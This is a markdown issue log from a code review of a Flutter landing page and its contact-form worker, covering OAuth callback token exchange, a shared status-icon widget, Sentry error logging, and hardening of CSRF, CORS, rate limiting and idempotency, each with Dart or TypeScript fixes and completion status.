## Issue #10: No Authorization Code Validation

**Severity:** CRITICAL
**Category:** Security
**Effort:** Medium (2-3 hours)
**Identified:** 2026-02-04 (Enterprise Code Review - Commit 4f0d02f)

### Problem Statement

The OAuth callback page (`lib/pages/oauth_callback_page.dart:114-116`) displays a success state immediately when a code is present, without validating or exchanging the code for tokens.

**Current Code:**
```dart
hasCode
  ? _buildSuccessState(context, isMobile)  // Shows success immediately!
  : _buildProcessingState(context, isMobile),
```

**Issues:**
- Success displayed before authentication completes
- No verification that the code is valid
- No protection against code replay attacks
- User may think they're authenticated when they're not

### Implementation

1. **Create OAuth token service (lib/services/oauth_token_service.dart):**

```dart
import 'package:http/http.dart' as http;
import 'dart:convert';

class OAuthTokenService {
  static const String _tokenEndpoint = 'https://oauth2.googleapis.com/token';

  /// Exchanges authorization code for tokens
  /// Throws OAuthException on failure
  static Future<TokenResponse> exchangeCode({
    required String code,
    required String codeVerifier,
    required String redirectUri,
  }) async {
    final response = await http.post(
      Uri.parse(_tokenEndpoint),
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: {
        'client_id': const String.fromEnvironment('GOOGLE_CLIENT_ID'),
        'code': code,
        'code_verifier': codeVerifier,
        'grant_type': 'authorization_code',
        'redirect_uri': redirectUri,
      },
    ).timeout(const Duration(seconds: 30));

    if (response.statusCode != 200) {
      final error = jsonDecode(response.body);
      throw OAuthException(
        error['error'] ?? 'token_exchange_failed',
        error['error_description'] ?? 'Failed to exchange authorization code',
      );
    }

    final data = jsonDecode(response.body);
    return TokenResponse(
      accessToken: data['access_token'],
      refreshToken: data['refresh_token'],
      expiresIn: data['expires_in'],
      tokenType: data['token_type'],
    );
  }
}

class TokenResponse {
  final String accessToken;
  final String? refreshToken;
  final int expiresIn;
  final String tokenType;

  const TokenResponse({
    required this.accessToken,
    this.refreshToken,
    required this.expiresIn,
    required this.tokenType,
  });
}

class OAuthException implements Exception {
  final String code;
  final String message;

  const OAuthException(this.code, this.message);

  @override
  String toString() => 'OAuthException: $code - $message';
}
```

2. **Update OAuth callback page state management:**

```dart
enum OAuthCallbackState {
  validating,
  exchangingCode,
  success,
  error,
}

class _OAuthCallbackPageState extends State<OAuthCallbackPage> {
  OAuthCallbackState _state = OAuthCallbackState.validating;
  String? _errorMessage;

  @override
  void initState() {
    super.initState();
    AnalyticsService.trackPageView('oauth_callback');
    _processCallback();
  }

  Future<void> _processCallback() async {
    // Handle explicit errors from OAuth provider
    if (widget.error != null) {
      setState(() {
        _state = OAuthCallbackState.error;
        _errorMessage = SecurityUtils.sanitizeUserInput(widget.errorDescription) ??
            'Authentication failed. Please try again.';
      });
      return;
    }

    // No code means nothing to process
    if (widget.code == null) {
      setState(() {
        _state = OAuthCallbackState.error;
        _errorMessage = 'No authorization code received.';
      });
      return;
    }

    // Validate state parameter (CSRF protection)
    final stateValid = await OAuthStateService.validateState(widget.state);
    if (!stateValid) {
      setState(() {
        _state = OAuthCallbackState.error;
        _errorMessage = 'Invalid authentication session. Please try again.';
      });
      _logSecurityEvent('state_validation_failed');
      return;
    }

    // Exchange code for tokens
    setState(() => _state = OAuthCallbackState.exchangingCode);

    try {
      final codeVerifier = await OAuthStateService.consumeCodeVerifier();
      if (codeVerifier == null) {
        throw const OAuthException('missing_verifier', 'PKCE verifier not found');
      }

      final tokens = await OAuthTokenService.exchangeCode(
        code: widget.code!,
        codeVerifier: codeVerifier,
        redirectUri: '${Uri.base.origin}/oauth/callback',
      );

      // Store tokens securely
      await SecureStorageService.storeTokens(tokens);

      setState(() => _state = OAuthCallbackState.success);
      AnalyticsService.trackEvent('oauth_success');

    } on OAuthException catch (e) {
      setState(() {
        _state = OAuthCallbackState.error;
        _errorMessage = e.message;
      });
      _logSecurityEvent('token_exchange_failed', {'error': e.code});

    } catch (e) {
      setState(() {
        _state = OAuthCallbackState.error;
        _errorMessage = 'Authentication failed. Please try again.';
      });
      ErrorTrackingService.captureException(e);
    }
  }

  void _logSecurityEvent(String event, [Map<String, dynamic>? extra]) {
    AnalyticsService.trackEvent('oauth_security_event', {
      'event': event,
      ...?extra,
    });
  }

  @override
  Widget build(BuildContext context) {
    return switch (_state) {
      OAuthCallbackState.validating => _buildProcessingState(context, isMobile, 'Validating...'),
      OAuthCallbackState.exchangingCode => _buildProcessingState(context, isMobile, 'Signing in...'),
      OAuthCallbackState.success => _buildSuccessState(context, isMobile),
      OAuthCallbackState.error => _buildErrorState(context, isMobile, customError: _errorMessage),
    };
  }
}
```

### Acceptance Criteria

- [ ] Authorization code exchanged for tokens before showing success
- [ ] Loading state shown during token exchange
- [ ] Token exchange errors handled gracefully
- [ ] Timeout handling for token exchange (30s)
- [ ] Tokens stored securely after exchange
- [ ] Security events logged for failures
- [ ] Unit tests for OAuthTokenService
- [ ] Integration tests for full callback flow

---

## Issue #11: Code Duplication - Icon Container Pattern

**Severity:** HIGH
**Category:** Code Quality / Maintainability
**Effort:** Low (1-2 hours)
**Identified:** 2026-02-04 (Enterprise Code Review - Commit 4f0d02f)

### Problem Statement

A 20+ line icon container pattern is duplicated 6 times across three files:
- `lib/pages/request_success_page.dart:84-104`
- `lib/pages/request_failure_page.dart:85-105`
- `lib/pages/oauth_callback_page.dart:127-147` (twice - success and error states)

**Impact:** Maintenance burden, inconsistency risk, violates DRY principle.

### Current Duplicated Code

```dart
Container(
  width: 80,
  height: 80,
  decoration: BoxDecoration(
    shape: BoxShape.circle,
    gradient: LinearGradient(
      begin: Alignment.topLeft,
      end: Alignment.bottomRight,
      colors: [
        AppColors.success.withValues(alpha: 0.2),
        AppColors.blue500.withValues(alpha: 0.2),
      ],
    ),
  ),
  child: Center(
    child: Container(
      width: 40,
      height: 40,
      decoration: BoxDecoration(
        shape: BoxShape.circle,
        color: AppColors.success,
      ),
      child: const Icon(LucideIcons.checkCircle2, color: Colors.white, size: 24),
    ),
  ),
)
```

### Implementation

1. **Create reusable widget (lib/widgets/common/status_icon.dart):**

```dart
import 'package:flutter/material.dart';
import 'package:lucide_icons_flutter/lucide_icons.dart';
import '../../theme/app_colors.dart';

/// Displays a status icon with gradient background for success/error states.
class StatusIcon extends StatelessWidget {
  final IconData icon;
  final Color primaryColor;
  final Color? secondaryColor;
  final double outerSize;
  final double innerSize;
  final double iconSize;

  const StatusIcon({
    super.key,
    required this.icon,
    required this.primaryColor,
    this.secondaryColor,
    this.outerSize = 80,
    this.innerSize = 40,
    this.iconSize = 24,
  });

  /// Success state with check icon and green/blue gradient
  const StatusIcon.success({super.key})
      : icon = LucideIcons.checkCircle2,
        primaryColor = AppColors.success,
        secondaryColor = AppColors.blue500,
        outerSize = 80,
        innerSize = 40,
        iconSize = 24;

  /// Error state with X icon and red gradient
  const StatusIcon.error({super.key})
      : icon = LucideIcons.xCircle,
        primaryColor = AppColors.error,
        secondaryColor = null,
        outerSize = 80,
        innerSize = 40,
        iconSize = 24;

  /// Processing state with loader icon and blue gradient
  const StatusIcon.processing({super.key})
      : icon = LucideIcons.loader2,
        primaryColor = AppColors.blue500,
        secondaryColor = AppColors.blue400,
        outerSize = 80,
        innerSize = 40,
        iconSize = 24;

  @override
  Widget build(BuildContext context) {
    return Semantics(
      label: _getSemanticLabel(),
      child: Container(
        width: outerSize,
        height: outerSize,
        decoration: BoxDecoration(
          shape: BoxShape.circle,
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [
              primaryColor.withValues(alpha: 0.2),
              (secondaryColor ?? primaryColor).withValues(alpha: 0.2),
            ],
          ),
        ),
        child: Center(
          child: Container(
            width: innerSize,
            height: innerSize,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              color: primaryColor,
            ),
            child: Icon(icon, color: Colors.white, size: iconSize),
          ),
        ),
      ),
    );
  }

  String _getSemanticLabel() {
    if (icon == LucideIcons.checkCircle2) return 'Success';
    if (icon == LucideIcons.xCircle) return 'Error';
    if (icon == LucideIcons.loader2) return 'Processing';
    return 'Status';
  }
}
```

2. **Update pages to use new widget:**

```dart
// request_success_page.dart
import '../widgets/common/status_icon.dart';

// Replace ~20 lines with:
const StatusIcon.success(),

// request_failure_page.dart
const StatusIcon.error(),

// oauth_callback_page.dart
const StatusIcon.success(),  // in _buildSuccessState
const StatusIcon.error(),    // in _buildErrorState
const StatusIcon.processing(), // in _buildProcessingState
```

3. **Export from widgets barrel (lib/widgets/widgets.dart):**

```dart
export 'common/status_icon.dart';
```

### Test Coverage Required

```dart
// test/widgets/common/status_icon_test.dart
group('StatusIcon', () {
  testWidgets('success displays check icon with green color', (tester) async {
    await tester.pumpWidget(const MaterialApp(
      home: Scaffold(body: StatusIcon.success()),
    ));

    expect(find.byIcon(LucideIcons.checkCircle2), findsOneWidget);
  });

  testWidgets('error displays X icon with red color', (tester) async {
    await tester.pumpWidget(const MaterialApp(
      home: Scaffold(body: StatusIcon.error()),
    ));

    expect(find.byIcon(LucideIcons.xCircle), findsOneWidget);
  });

  testWidgets('has semantic label for accessibility', (tester) async {
    await tester.pumpWidget(const MaterialApp(
      home: Scaffold(body: StatusIcon.success()),
    ));

    final semantics = tester.getSemantics(find.byType(StatusIcon));
    expect(semantics.label, 'Success');
  });
});
```

### Acceptance Criteria

- [ ] StatusIcon widget created with success/error/processing factories
- [ ] Widget includes semantic labels for accessibility
- [ ] All three pages updated to use StatusIcon
- [ ] No code duplication for icon containers
- [ ] Widget tests with 100% coverage
- [ ] Visual regression tests pass

---

## Issue #12: Missing OAuth Error Logging

**Severity:** HIGH
**Category:** Observability
**Effort:** Low (30 minutes)
**Identified:** 2026-02-04 (Enterprise Code Review - Commit 4f0d02f)

### Problem Statement

OAuth errors are displayed to users but not logged to Sentry, making it impossible to:
- Monitor OAuth failure rates
- Identify provider-side issues
- Debug user-reported authentication problems
- Track potential attack patterns

### Current Code (lib/pages/oauth_callback_page.dart)

```dart
@override
void initState() {
  super.initState();
  AnalyticsService.trackPageView('oauth_callback');
  // No error logging!
}
```

### Implementation

```dart
@override
void initState() {
  super.initState();
  AnalyticsService.trackPageView('oauth_callback');

  // Log OAuth errors to Sentry
  if (widget.error != null) {
    ErrorTrackingService.captureMessage(
      'OAuth callback error: ${widget.error}',
      level: SentryLevel.warning,
      context: 'OAuthCallbackPage',
      extra: {
        'error': widget.error,
        'error_description': widget.errorDescription,
        'has_state': widget.state != null,
        'has_code': widget.code != null,
      },
    );

    // Track for analytics
    AnalyticsService.trackEvent('oauth_callback_error', {
      'error_type': widget.error,
    });
  } else if (widget.code != null) {
    AnalyticsService.trackEvent('oauth_callback_success');
  }
}
```

### Sentry Alert Configuration

Create alert rule in Sentry dashboard:
- **Name:** OAuth Callback Errors
- **Conditions:**
  - Event message contains "OAuth callback error"
  - Frequency > 5 events in 10 minutes
- **Actions:** Email + Slack notification
- **Tags:** `context:OAuthCallbackPage`

### Acceptance Criteria

- [ ] OAuth errors logged to Sentry with full context
- [ ] Analytics events tracked for success/failure
- [ ] Sentry alert configured for error spike detection
- [ ] Dashboard shows OAuth error trends

---

## Issue #13: Misleading Dashboard Button

**Severity:** HIGH
**Category:** UX / Code Quality
**Effort:** Low (15 minutes)
**Identified:** 2026-02-04 (Enterprise Code Review - Commit 4f0d02f)

### Problem Statement

The OAuth success state has a "Go to Dashboard" button that routes to `/` (home page), same as the "Back to Home" button. This is misleading to users who expect to go to a dashboard.

### Current Code (lib/pages/oauth_callback_page.dart:176-180)

```dart
OutlineButton(
  text: 'Back to Home',
  onPressed: () => context.go('/'),
),
GradientButton(
  text: 'Go to Dashboard',  // Misleading!
  onPressed: () => context.go('/'),  // Same as above
),
```

### Options

**Option A: Rename button (if no dashboard exists):**
```dart
GradientButton(
  text: 'Continue',
  onPressed: () => context.go('/'),
),
```

**Option B: Route to actual dashboard (if dashboard exists):**
```dart
GradientButton(
  text: 'Go to Dashboard',
  onPressed: () => context.go('/dashboard'),
),
```

**Option C: Remove duplicate button:**
```dart
// Single button only
GradientButton(
  text: 'Continue to Site',
  onPressed: () => context.go('/'),
),
```

### Recommendation

Since this is a landing page without a dashboard, use **Option A** or **Option C**.

### Acceptance Criteria

- [ ] Button text accurately reflects destination
- [ ] No duplicate functionality between buttons
- [ ] User expectations match button behavior

---

## Priority Matrix

| Issue | Severity | Status | Commit |
|-------|----------|--------|--------|
| #7 XSS Vulnerability | CRITICAL | **COMPLETED** | a2e7cac, 1c9d6cf |
| #8 OAuth State Validation | CRITICAL | DEFERRED | N/A - No OAuth backend |
| #9 PKCE Implementation | CRITICAL | DEFERRED | N/A - No OAuth backend |
| #10 Auth Code Validation | CRITICAL | DEFERRED | N/A - No OAuth backend |
| #11 Code Duplication | HIGH | **COMPLETED** | 91219bb |
| #12 OAuth Error Logging | HIGH | **COMPLETED** | 6e254de |
| #13 Misleading Dashboard Button | HIGH | **COMPLETED** | 91219bb |

## Implementation Notes

**Issues #8-10 (OAuth State/PKCE/Code Validation):**
These issues are **deferred** because:
- This is a landing page with placeholder OAuth callback UI
- There is no actual OAuth backend or token exchange implementation
- The OAuth callback page is for demonstration/future use only
- When OAuth is actually implemented, these security measures MUST be added

**Completed Issues:**
- #7: Added comprehensive XSS sanitization with SecurityUtils class
- #11: Extracted StatusIcon widget, removed 75+ lines of duplicated code
- #12: Added Sentry error logging and analytics tracking for OAuth errors
- #13: Changed "Go to Dashboard" to "Continue" for accurate UX

**Completed Enhancements (2026-02-06):**
- CSP: Added `report-to` directive alongside `report-uri` with Report-To HTTP header
- CSP: `frame-ancestors 'self'` already present
- E2E: Added dedicated GitHub Actions workflow (.github/workflows/e2e.yml)
- E2E: Added cache header validation tests (cache-headers.spec.ts)
- E2E: Added mobile viewport tests for iPhone/Pixel/iPad (mobile-viewport.spec.ts)
- E2E: Added accessibility tests - HTML a11y, ARIA, noscript fallback (accessibility.spec.ts)

**Contact Form Enhancement (2026-02-06):**
- Added companySize and useCase fields for lead qualification
- Made message field optional to reduce form friction
- Added full-name builder for firstName/lastName support
- Added XSS sanitization tests for new fields

**Contact Form Robustness (2026-02-06):**
- Fixed empty string vs null inconsistency for optional fields (message, organization, companySize, useCase)
- Added retry logic with exponential backoff (2 retries, 1s/2s delays) for transient network errors

---

## Issue #14: CSRF Token Lifecycle Issues

**Severity:** MEDIUM
**Category:** Security
**Effort:** Medium (2-4 hours)
**Identified:** 2026-02-06 (Contact Form Production Review)

### Problems

1. **Cache/expiration mismatch** - Client caches CSRF tokens for 5 minutes (`contact_service.dart:221`) but server expires them after 1 hour (`index.ts:22`). Multiple valid tokens can exist simultaneously during overlap windows.

2. **Silent CSRF fetch failure** - `_fetchCsrfToken()` (`contact_service.dart:234-237`) catches errors and returns `null` silently. Form submissions proceed without CSRF protection with no Sentry logging.

3. **Race condition on invalidation** - `clearCsrfCache()` after success (`contact_service.dart:283`) creates a window where concurrent submissions could reuse tokens.

### Recommendations

- Align token cache duration with server expiration (both 1 hour or both 5 minutes)
- Log CSRF fetch failures to Sentry at warning level
- Fetch fresh token per submission to eliminate cache race conditions

---

## Issue #15: Rate Limiting Degraded Mode Has No Fallback

**Severity:** MEDIUM
**Category:** Security / Reliability
**Effort:** Medium (2-4 hours)
**Identified:** 2026-02-06 (Contact Form Production Review)

### Problem

When KV storage is unavailable, rate limiting fails open (`index.ts:68-86, 109-127`), allowing unlimited requests. Only console logging occurs - no fallback rate limiting.

### Recommendations

- Add in-memory rate limiting fallback using Worker global scope
- Add circuit breaker pattern after N consecutive KV failures
- Send Sentry alerts on degraded mode activation

---

## Issue #16: CORS Origin Fallback Allows Bypass

**Severity:** MEDIUM
**Category:** Security
**Effort:** Low (30 minutes)
**Identified:** 2026-02-06 (Contact Form Production Review)

### Problem

CORS handler (`index.ts:223-225`) defaults to `ALLOWED_ORIGINS[0]` when Origin header is missing or unrecognized, allowing requests from any origin to succeed.

```typescript
const allowedOrigin = ALLOWED_ORIGINS.includes(origin) ? origin : ALLOWED_ORIGINS[0];
```

### Recommendation

- Return 403 if Origin header doesn't match allowed list (for POST requests)
- Log CORS violations for monitoring

---

## Issue #17: No Idempotency Protection for Duplicate Submissions

**Severity:** MEDIUM
**Category:** Reliability
**Effort:** Medium (2-4 hours)
**Identified:** 2026-02-06 (Contact Form Production Review)

### Problem

If user double-clicks submit or browser retries, duplicate emails are sent. UI disables button during submission (`contact_section.dart:163`), but browser-level retries or race conditions can bypass this.

### Recommendations

- Generate idempotency key (UUID) per submission attempt
- Server deduplicates within time window using KV storage
- Return 409 Conflict for duplicate submissions

---

## Issue #18: Rate Limit Headers Not Parsed on Client

**Severity:** LOW
**Category:** UX
**Effort:** Low (1 hour)
**Identified:** 2026-02-06 (Contact Form Production Review)

### Problem

Server returns `Retry-After` and `X-RateLimit-*` headers on 429 responses (`index.ts:348-355`), but client never inspects them. User sees generic "too many requests" error with no countdown.

### Recommendation

- Parse `Retry-After` header and display retry countdown to user

---

## Issue #19: Email Mailto XSS via Parameter Injection

**Severity:** LOW
**Category:** Security
**Effort:** Low (15 minutes)
**Identified:** 2026-02-06 (Contact Form Production Review)

### Problem

Email template (`index.ts:401`) uses `escapeHtml()` for email in `href="mailto:"` attribute. Should use `encodeURIComponent()` for URL context to prevent mailto parameter injection.

### Recommendation

- Use `encodeURIComponent()` for href attribute values in mailto links

---

## Issue #20: Timeout Handling Mismatch Between Client and Worker

**Severity:** LOW
**Category:** Reliability
**Effort:** Low (30 minutes)
**Identified:** 2026-02-06 (Contact Form Production Review)

### Problem

Both client and worker have 10s timeout. Worker 504 response passes client's `validateStatus` check (`status < 500` is false for 504, so it throws). The error path works but the timeout budget doesn't account for both layers.

### Recommendation

- Reduce worker Resend timeout to 8s to allow client to handle 504 gracefully
- Add explicit 504 handling on client

---

## Issue #21: Hardcoded API Endpoint URL

**Severity:** LOW
**Category:** Maintainability
**Effort:** Low (30 minutes)
**Identified:** 2026-02-06 (Contact Form Production Review)

### Problem

Worker endpoint URL is hardcoded (`contact_service.dart:6`), preventing testing against staging/development environments without code changes.

### Recommendation

- Make endpoint configurable via `--dart-define=CONTACT_API_URL=...`

---

## Contact Form Review Priority Matrix

| Issue | Severity | Status | Description |
|-------|----------|--------|-------------|
| #5 Empty string vs null | HIGH | **COMPLETED** | Normalized empty strings to null for optional fields |
| #6 No retry logic | HIGH | **COMPLETED** | Added exponential backoff (2 retries, 1s/2s) |
| #14 CSRF lifecycle | MEDIUM | **COMPLETED** | Removed cache, fetch per-submission, Sentry logging (4e792cb) |
| #15 Rate limit fallback | MEDIUM | **COMPLETED** | In-memory fallback with circuit breaker, 10K cap (a9e1437, 6034d4b) |
| #16 CORS bypass | MEDIUM | **COMPLETED** | 403 for unauthorized origins, CORS violation logging (95b08a5) |
| #17 Idempotency | MEDIUM | **COMPLETED** | Client idempotency key + server KV dedup with 5min TTL (1e65412) |
| #18 Rate limit UX | LOW | **COMPLETED** | Parse Retry-After header, show countdown to user (6b154e7) |
| #19 Mailto XSS | LOW | **COMPLETED** | encodeURIComponent for mailto href (4c4485e) |
| #20 Timeout mismatch | LOW | **COMPLETED** | Worker Resend timeout 8s, client handles 504 with retry (3877f60) |
| #21 Hardcoded URL | LOW | **COMPLETED** | Configurable via --dart-define=CONTACT_API_URL (4e792cb) |

---

**Contact Form Hardening (2026-02-12):**
- #14: Removed CSRF token caching, fetch fresh per submission, added Sentry logging for fetch failures
- #15: In-memory rate limit fallback with circuit breaker (3 failures, 60s cooldown), 10K entry hard cap
- #16: CORS rejects POST/GET from unauthorized origins with 403, logs violations
- #17: Client generates 256-bit idempotency key per submission, server deduplicates via KV (5min TTL)
- #18: Client parses Retry-After header on 429, displays countdown to user
- #19: Uses encodeURIComponent for mailto href to prevent parameter injection
- #20: Worker Resend timeout reduced to 8s (from 10s), client handles 504 with retry
- #21: API endpoint configurable via --dart-define=CONTACT_API_URL
- Full-stack production code review completed: 57 worker tests, 31 client tests passing

*Last updated: 2026-02-12 (6 of 7 original issues completed, 3 deferred; 10 of 10 contact form review findings completed)*
